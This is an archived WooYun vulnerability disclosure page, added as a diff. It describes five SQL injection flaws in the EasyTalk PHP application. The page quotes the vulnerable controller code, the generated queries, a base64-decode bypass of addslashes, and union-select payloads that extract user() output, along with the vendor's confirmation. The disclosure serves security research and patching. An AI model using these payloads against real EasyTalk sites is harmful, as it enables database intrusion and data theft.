@@ -1,0 +1,409 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		EasyTalk Sql Injection 1-5  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		EasyTalk Sql Injection 1-5  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/′  雨。">′  雨。</a> 
+</li><li>提交时间：		2014-02-09 10:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-12：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-01：	细节向普通白帽子公开<br/>
+									2014-03-21：	细节向实习白帽子公开<br/>
+									2014-05-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">过滤不严。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注入1：<br />
+<br />
+在topicaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function topic() {<br />
+		$keyword=$this-&gt;_get(&#039;keyword&#039;,&#039;urldecode&#039;);//无过滤 且解码<br />
+		if ($keyword) {<br />
+			$topic = D(&#039;Topic&#039;)-&gt;where(&quot;topicname=&#039;$keyword&#039;&quot;)-&gt;find();<br />
+            if ($topic) {<br />
+                $isfollow=D(&#039;Mytopic&#039;)-&gt;isfollow($topic[&#039;id&#039;],$this-&gt;my[&#039;user_id&#039;]);<br />
+                $topicusers=D(&#039;MytopicView&#039;)-&gt;where(&quot;topicid=&#039;$topic[id]&#039;&quot;)-&gt;order(&#039;id desc&#039;)-&gt;limit(9)-&gt;select();<br />
+				//getwidget<br />
+				$widget=M(&#039;Topicwidget&#039;)-&gt;where(&quot;topicid=&#039;$topic[id]&#039;&quot;)-&gt;order(&#039;`order` ASC&#039;)-&gt;select();<br />
+				if ($widget) {<br />
+					foreach ($widget as $val) {<br />
+						$topicwidget[$val[&#039;widgettype&#039;]][]=$val;<br />
+					}<br />
+				}<br />
+				$this-&gt;assign(&#039;topicwidget&#039;,$topicwidget);<br />
+            } else {<br />
+                $count=$isfollow=0;<br />
+            }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$topic = D(&#039;Topic&#039;)-&gt;where(&quot;topicname=&#039;$keyword&#039;&quot;)-&gt;find();<br />
+<br />
+<br />
+<br />
+这里  带入查询。<br />
+<br />
+<br />
+<br />
+where topicname=&#039;keyword&#039;;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+SELECT * FROM `et_topic` WHERE topicname=&#039;aaa&#039; LIMIT 1<br />
+<br />
+<br />
+<br />
+构造一下 aaa&#039; and 1=2 union select 1,2,3,user(),5 %23<br />
+<br />
+<br />
+<br />
+完美注入。<br />
+<br />
+</p><p class="detail"><a href="../images/06145004322c9f954d02b9692a4a4634fd425635.jpg" target="_blank"><img src="../images/06145004322c9f954d02b9692a4a4634fd425635.jpg" alt="FLOG87(6(ZPYF746_WNC14Q.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入2：<br />
+<br />
+<br />
+<br />
+在settingaction.class.php 中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function doauth() {<br />
+        $_authmsg=daddslashes($_GET[&#039;auth&#039;]);<br />
+        $authmsg=base64_decode($_authmsg);<br />
+        $tem=explode(&quot;:&quot;,$authmsg);<br />
+        $send_id=$tem[0];<br />
+        $user=M(&#039;Users&#039;);<br />
+<br />
+        $row = $user-&gt;field(&#039;mailadres,auth_email&#039;)-&gt;where(&quot;user_id=&#039;$send_id&#039;&quot;)-&gt;find();<br />
+        if ($_authmsg==$row[&#039;auth_email&#039;]) {<br />
+            $user-&gt;where(&quot;user_id=&#039;$send_id&#039;&quot;)-&gt;setField(&#039;auth_email&#039;,1);<br />
+            setcookie(&#039;setok&#039;, json_encode(array(&#039;lang&#039;=&gt;L(&#039;mail6&#039;),&#039;ico&#039;=&gt;1)),0,&#039;/&#039;);<br />
+        } else {<br />
+            setcookie(&#039;setok&#039;, json_encode(array(&#039;lang&#039;=&gt;L(&#039;mail7&#039;),&#039;ico&#039;=&gt;2)),0,&#039;/&#039;);<br />
+        }<br />
+        header(&#039;location:&#039;.SITE_URL.&#039;/?m=setting&amp;a=mailauth&#039;);<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$_authmsg  虽然用addslashes 进行处理后 但是 后面解码。<br />
+<br />
+<br />
+<br />
+所以 无视过滤。<br />
+<br />
+ 然后切割成数组 数组的第一个 带入查询。<br />
+<br />
+$row = $user-&gt;field(&#039;mailadres,auth_email&#039;)-&gt;where(&quot;user_id=&#039;$send_id&#039;&quot;)-&gt;find();<br />
+<br />
+<br />
+<br />
+where user_id = &#039;$send_id&#039;<br />
+<br />
+<br />
+<br />
+完美注入。 无视Gpc<br />
+<br />
+首先编码一下 然后注入 <br />
+<br />
+SELECT `mailadres`,`auth_email` FROM `et_users` WHERE user_id=&#039;yu&#039; union select user(),2#&#039; LIMIT 1<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0615074973ac532bf8dc102c1712ccfaa9119595.jpg" target="_blank"><img src="../images/0615074973ac532bf8dc102c1712ccfaa9119595.jpg" alt="F2)_R}R{VZDIMRLUG3NUO0U.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+完美注入。<br />
+<br />
+<br />
+<br />
+注入3：<br />
+<br />
+在messageaction.class.php中。<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function show() {<br />
+		$uid=$_GET[&#039;uid&#039;];<br />
+<br />
+		$mes=M(&#039;Messages&#039;);<br />
+<br />
+		$count = $mes-&gt;where(&quot;(senduid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; AND sendtouid=&#039;$uid&#039;) OR (senduid=&#039;$uid&#039; AND sendtouid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;count();<br />
+		$p= new Page($count,20);<br />
+		$page = $p-&gt;show(&#039;message/show/uid/&#039;.$uid.&#039;/p/&#039;,1,&#039;action-for=&quot;stream&quot;&#039;);<br />
+		$data = D(&#039;MessagesView&#039;)-&gt;where(&quot;(senduid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; AND sendtouid=&#039;$uid&#039;) OR (senduid=&#039;$uid&#039; AND sendtouid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;order(&quot;message_id DESC&quot;)-&gt;limit($p-&gt;firstRow.&#039;,&#039;.$p-&gt;listRows)-&gt;select();</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$uid 无过滤 直接带入了查询。<br />
+<br />
+<br />
+<br />
+$count = $mes-&gt;where(&quot;(senduid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; AND sendtouid=&#039;$uid&#039;) OR (senduid=&#039;$uid&#039; AND sendtouid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;count();<br />
+<br />
+<br />
+<br />
+SELECT COUNT(*) AS tp_count FROM `et_messages` WHERE (senduid=&#039;2&#039; AND sendtouid=&#039;aaaa&#039; AND sendtouid=&#039;2&#039;) LIMIT 1<br />
+<br />
+执行的sql  构造一下语句。<br />
+<br />
+</p><p class="detail"><a href="../images/061511152b1661b012b522e75f07a57dac3721ce.jpg" target="_blank"><img src="../images/061511152b1661b012b522e75f07a57dac3721ce.jpg" alt="LW7K~MBNXK3$B[0G2RNQWHX.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+有图有真相。<br />
+<br />
+注入4：<br />
+<br />
+在photoaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function show() {<br />
+		$cid=$_GET[&#039;cid&#039;];<br />
+		<br />
+		$content=D(&#039;ContentView&#039;)-&gt;where(&quot;content_id=&#039;$cid&#039; AND FIND_IN_SET(&#039;p&#039;,filetype)&quot;)-&gt;find();<br />
+		if (!$content) {<br />
+			$this-&gt;display(&#039;nophoto&#039;);<br />
+			exit;<br />
+		}<br />
+		<br />
+		$cModel=M(&#039;Content&#039;);<br />
+		$count=$cModel-&gt;where(&quot;user_id=&#039;$content[user_id]&#039; AND FIND_IN_SET(&#039;p&#039;,filetype)&quot;)-&gt;count();</code></pre><p class='detail'><br />
+<br />
+$cid 无过滤 且直接带入了<br />
+<br />
+<br />
+<br />
+where(&quot;content_id=&#039;$cid&#039; AND FIND_IN_SET(&#039;p&#039;,filetype)&quot;)-&gt;find();<br />
+<br />
+<br />
+<br />
+content_id=$cid<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+SELECT Content.content_id AS content_id,Content.content_body AS content_body,Content.posttime AS posttime,Content.type AS type,Content.filetype AS filetype,Content.retid AS retid,Content.replyid AS replyid,Content.replytimes AS replytimes,Content.zftimes AS zftimes,Content.pinbi AS pinbi,Content.zhiding AS zhiding,Content.praisetimes AS praisetimes,Plugins.name AS appname,Plugins.directory AS directory,Plugins.available AS available,Plugins.type AS apptype,Users.user_id AS user_id,Users.user_name AS user_name,Users.nickname AS nickname,Users.user_head AS user_head,Users.user_auth AS user_auth,Users.provinceid AS provinceid,Users.cityid AS cityid FROM et_content Content ignore index(replyid) LEFT JOIN et_plugins Plugins ON Content.type=Plugins.directory LEFT JOIN et_users Users ON Content.user_id=Users.user_id WHERE content_id=&#039;aaa&#039; AND FIND_IN_SET(&#039;p&#039;,filetype) LIMIT 1<br />
+<br />
+<br />
+<br />
+这个是执行的语句 来构造一下语句。<br />
+<br />
+</p><p class="detail"><a href="../images/0615183033c4d9475ba1f9c0a46d25145327b430.jpg" target="_blank"><img src="../images/0615183033c4d9475ba1f9c0a46d25145327b430.jpg" alt="T_T`[DOJ}15T9FRZ`[N@ELP.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入成功 有图有真相。<br />
+<br />
+<br />
+<br />
+注入5：<br />
+<br />
+在appaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function applist() {<br />
+		parent::tologin();<br />
+		import(&quot;@.ORG.Page&quot;);<br />
+        C(&#039;PAGE_NUMBERS&#039;,10);<br />
+		$pvmodel=D(&#039;PluginsView&#039;);<br />
+		$keyword=trim(htmlspecialchars($_REQUEST[&#039;keyword&#039;]));<br />
+<br />
+		if (!$keyword) {<br />
+			$count=M(&#039;Plugins&#039;)-&gt;where(&quot;available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;)&quot;)-&gt;count();<br />
+			$p= new Page($count,20);<br />
+			$page = $p-&gt;show(&quot;?m=app&amp;a=applist&amp;p=&quot;);<br />
+			$app=$pvmodel-&gt;where(&quot;available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;)&quot;)-&gt;order(&quot;installs DESC&quot;)-&gt;limit($p-&gt;firstRow.&#039;,&#039;.$p-&gt;listRows)-&gt;select();<br />
+		} else {<br />
+			$count=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;)&quot;)-&gt;count();<br />
+			$p= new Page($count,20);<br />
+			$page = $p-&gt;show(&quot;?m=app&amp;a=applist&amp;keyword=$keyword&amp;p=&quot;);<br />
+			$app=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;)&quot;)-&gt;order(&quot;installs DESC&quot;)-&gt;limit($p-&gt;firstRow.&#039;,&#039;.$p-&gt;listRows)-&gt;select();</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$KEYWORD为 request 获取的 然后html实体 但是对注入的影响不大。<br />
+<br />
+<br />
+<br />
+如果keyword 为true的话就带入<br />
+<br />
+$count=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;)&quot;)-&gt;count();<br />
+<br />
+<br />
+<br />
+SELECT COUNT(*) AS tp_count FROM et_plugins Plugins LEFT JOIN et_users Users ON Plugins.appauthor=Users.user_id WHERE name LIKE &#039;%yu%&#039; AND available=1 AND (type=&#039;app&#039; || type=&#039;api&#039;) LIMIT 1<br />
+<br />
+<br />
+<br />
+所执行的语句 构造一下<br />
+<br />
+</p><p class="detail"><a href="../images/061528142fd861a37c45d6b4167f2b960465d2d5.jpg" target="_blank"><img src="../images/061528142fd861a37c45d6b4167f2b960465d2d5.jpg" alt="JQAL[HG0E1O}IAW1}TTL0SN.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入成功 有图有真相 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤呗。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/′  雨。" title="′  雨。">′  雨。</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050338" title="EasyTalk Sql Injection 1-5">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2014-02-09 16:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">正在修复中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50338";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
